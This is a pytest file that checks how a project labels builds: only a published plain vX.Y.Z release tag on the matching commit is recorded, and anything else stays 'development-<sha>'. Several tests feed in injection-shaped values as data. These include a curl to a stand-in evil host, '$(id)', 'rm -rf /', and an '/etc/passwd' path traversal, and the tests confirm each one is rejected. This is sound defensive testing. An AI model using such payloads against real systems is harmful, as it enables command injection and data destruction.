# SPDX-License-Identifier: Apache-2.0
"""Release builds record vX.Y.Z; every other build stays development-<sha> (#235)."""

import json
import sys
from pathlib import Path

import pytest
import yaml

from docs import checkout_version

ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = ROOT / ".github/workflows"
COMMIT = "fdbf233f6fbaef3bf6589a056821bde3ebb634e2"
OTHER = "a" * 40
TAG = "v2.12.0"
DEVELOPMENT = f"development-{COMMIT}"

RELEASE = {
    "RELEASE_PUBLISHED": "true",
    "RELEASE_TAG": TAG,
    "RELEASE_COMMIT": COMMIT,
}


def identity(env):
    return checkout_version(COMMIT, env)


def test_a_published_plain_tag_on_this_commit_is_the_checkout_identity():
    assert identity(RELEASE) == TAG
    assert identity(RELEASE) != DEVELOPMENT


@pytest.mark.parametrize("published", [None, "false", "", "False", "1", "yes", "true "])
def test_unset_or_false_publication_stays_development(published):
    env = dict(RELEASE)
    if published is None:
        env.pop("RELEASE_PUBLISHED")
    else:
        env["RELEASE_PUBLISHED"] = published
    assert identity(env) == DEVELOPMENT
    assert TAG not in identity(env)


def test_a_missing_release_env_stays_development():
    assert identity({}) == DEVELOPMENT


@pytest.mark.parametrize("release_commit", [None, "", OTHER])
def test_a_release_without_this_commit_stays_development(release_commit):
    """Absent or empty RELEASE_COMMIT must not count as this commit."""
    env = dict(RELEASE)
    if release_commit is None:
        del env["RELEASE_COMMIT"]
    else:
        env["RELEASE_COMMIT"] = release_commit
    assert identity(env) == DEVELOPMENT
    assert identity(env) != TAG
    if release_commit == OTHER:
        assert checkout_version(OTHER, env) == TAG


@pytest.mark.parametrize("tag", [None, ""])
def test_a_release_without_a_tag_stays_development(tag):
    env = dict(RELEASE)
    if tag is None:
        del env["RELEASE_TAG"]
    else:
        env["RELEASE_TAG"] = tag
    assert identity(env) == DEVELOPMENT


@pytest.mark.parametrize(
    "tag",
    [
        "v2.12.0-rc.1",
        "v2.12.0-alpha.1",
        "v2.12.0+build.1",
        "v2.12",
        "2.12.0",
        "v02.12.0",
        "V2.12.0",
    ],
)
def test_a_prerelease_or_non_plain_tag_stays_development(tag):
    assert identity({**RELEASE, "RELEASE_TAG": tag}) == DEVELOPMENT
    assert tag not in identity({**RELEASE, "RELEASE_TAG": tag})


@pytest.mark.parametrize(
    "tag",
    [
        "v2.12.0; curl http://evil.example",
        "v2.12.0$(id)",
        "v2.12.0`id`",
        "v2.12.0 && true",
        "v2.12.0|tee /tmp/x",
        "v2.12.0\nrm -rf /",
        "v2.12.0 ",
        " v2.12.0",
        "v2.12.0/../../../etc/passwd",
        "refs/tags/v2.12.0",
    ],
)
def test_an_injection_shaped_tag_stays_development(tag):
    assert identity({**RELEASE, "RELEASE_TAG": tag}) == DEVELOPMENT
    assert tag not in identity({**RELEASE, "RELEASE_TAG": tag})


def test_verifier_version_alone_does_not_relabel_a_build():
    """The image build arg is X.Y.Z or dev. It is not the checkout identity."""
    assert identity({"LIVINGPROOF_VERIFIER_VERSION": "2.12.0"}) == DEVELOPMENT
    assert identity({"LIVINGPROOF_VERIFIER_VERSION": "dev", **RELEASE}) == TAG


def test_a_non_sha_commit_cannot_carry_a_release_label():
    poisoned = "fdbf233; curl http://evil.example"
    env = {**RELEASE, "RELEASE_COMMIT": poisoned}
    assert checkout_version(poisoned, env) == f"development-{poisoned}"


def _loaded_conftest():
    for module in sys.modules.values():
        file = getattr(module, "__file__", None)
        if file and file.endswith("tests/conftest.py") and hasattr(module, "pytest_sessionfinish"):
            return module
    raise RuntimeError("verification conftest is not loaded")


def test_the_verification_session_records_the_release_tag(tmp_path, monkeypatch):
    """The session hook writes vX.Y.Z, not a truthy expression that ignores the tag."""
    module = _loaded_conftest()
    monkeypatch.setattr(module, "ROOT", tmp_path)
    monkeypatch.setattr(module, "source_identity", lambda: {"tools/docs.py": "abc"})
    monkeypatch.setenv("SOURCE_COMMIT", COMMIT)
    monkeypatch.setenv("RELEASE_PUBLISHED", "true")
    monkeypatch.setenv("RELEASE_TAG", TAG)
    monkeypatch.setenv("RELEASE_COMMIT", COMMIT)
    monkeypatch.setenv("GITHUB_RUN_URL", "https://example.test/runs/1")
    xml = tmp_path / "artifacts" / "results.xml"
    xml.parent.mkdir(parents=True)
    xml.write_bytes(b"<testsuite/>")

    class Option:
        xmlpath = str(xml)

    class Config:
        option = Option()

    class Session:
        config = Config()
        testscollected = 1

    hook = module.pytest_sessionfinish(Session(), 0)
    next(hook)
    with pytest.raises(StopIteration):
        next(hook)

    context = json.loads((tmp_path / "artifacts" / "test-context.json").read_text())
    assert context["commit"] == COMMIT
    assert context["version"] == TAG
    assert context["version"] != DEVELOPMENT
    assert context["run"] == "https://example.test/runs/1"
    assert context["exitstatus"] == 0
    assert context["collected"] == 1


def test_verification_records_checkout_version_instead_of_git_describe():
    """Reverting conftest to git describe brings back development-<sha> on release images."""
    text = (ROOT / "tests/conftest.py").read_text()
    assert "checkout_version(commit)" in text
    assert "describe" not in text
    assert ".git" in (ROOT / ".dockerignore").read_text().splitlines()


def test_runtime_forwards_release_identity_and_keeps_jq():
    compose = yaml.safe_load((ROOT / "compose.yml").read_text())
    env = compose["services"]["verifier"]["environment"]
    assert env["RELEASE_PUBLISHED"] == "${RELEASE_PUBLISHED:-}"
    assert env["RELEASE_TAG"] == "${RELEASE_TAG:-}"
    assert env["RELEASE_COMMIT"] == "${RELEASE_COMMIT:-}"
    dockerfile = (ROOT / "Dockerfile").read_text()
    runtime = dockerfile.split("AS runtime", 1)[1].split("AS development", 1)[0]
    assert "jq" in runtime
    assert "ARG RELEASE_TAG" not in dockerfile


def test_only_the_released_manual_build_receives_the_published_tag():
    """published is the literal true: semantic-release leaves that output false for a draft.

    release-reports publishes the draft, then this job's guard confirms the immutable
    tag. The preview documentation job must not receive the identity.
    """
    release = yaml.safe_load((WORKFLOWS / "documentation-release.yml").read_text())
    steps = release["jobs"]["build"]["steps"]
    expected = {
        "RELEASE_PUBLISHED": "true",
        "RELEASE_TAG": "${{ inputs.release_tag }}",
        "RELEASE_COMMIT": "${{ inputs.commit }}",
    }
    named = {step.get("name"): step for step in steps}
    # checkout_version runs inside task verify. The env must sit on that command.
    runs = {"Verify the released source": "task verify", "Build the released manual": "task docs"}
    for name, command in runs.items():
        step = named[name]
        assert step["env"] == expected
        assert step["run"] == command
        assert "${{" not in step["run"]
    for step in steps:
        run = step.get("run")
        if isinstance(run, str):
            assert "${{" not in run
    verify = yaml.safe_load((WORKFLOWS / "verify.yml").read_text())
    preview = verify["jobs"]["documentation"]
    assert "RELEASE_PUBLISHED" not in (preview.get("env") or {})
    for step in preview["steps"]:
        assert "RELEASE_PUBLISHED" not in (step.get("env") or {})
    call = verify["jobs"]["documentation-release"]["with"]
    assert call["release_tag"] == "${{ needs.release.outputs.git-tag }}"
    assert call["commit"] == "${{ needs.release.outputs.commit }}"
    assert call["version"] == "${{ needs.release.outputs.version }}"
